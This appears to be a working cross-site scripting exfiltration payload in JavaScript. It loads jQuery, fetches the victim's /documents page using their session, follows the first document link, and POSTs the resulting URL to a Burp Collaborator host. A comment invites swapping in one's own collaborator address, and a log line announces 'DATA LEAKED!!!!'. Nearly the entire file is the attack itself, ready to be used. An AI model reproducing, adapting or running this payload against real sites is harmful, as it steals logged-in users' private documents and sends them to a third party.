var jq = document.createElement('script');
jq.src = "https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js";
document.getElementsByTagName('head')[0].appendChild(jq);
setTimeout(() => {
    var xhr = new XMLHttpRequest();

    // Setup our listener to process completed requests
    xhr.onload = function () {

        // Process our return data
        if (xhr.status >= 200 && xhr.status < 300) {
            // Runs when the request is successful
            //var a=xhr.response.Text
            //console.log(typeof(a))
            console.log("Running")
            console.log(xhr.responseText);
            resp = xhr.responseText;
            aTag = $(resp).find('.document > h4 >a')[0];
            url_1 = $(aTag).attr('href');
            console.log(url_1);

            var xhr2 = new XMLHttpRequest();
            xhr2.onload = function () {
                console.log(xhr2.responseText);

                var xhr3 = new XMLHttpRequest();
                xhr3.onload = function () {
                    console.log("DATA LEAKED!!!!")
                }
                xhr3.open('POST', 'https://p0qb2gvh3q4m9ke2ufqlj1mdk4quej.burpcollaborator.net/pdfURL'); // CHANGE THIS TO UR BURP COLLAB
                xhr3.send("url="+xhr2.responseURL);

            }
            xhr2.open('GET', url_1);
            xhr2.send();

        } else {
            // Runs when it's not
            console.log("Not Running")
            console.log(xhr.responseText);
        }

    };

    // Create and send a GET request
    // The first argument is the post type (GET, POST, PUT, DELETE, etc.)
    // The second argument is the endpoint URL
    xhr.open('GET', '/documents');
    xhr.send();
}, 2000);
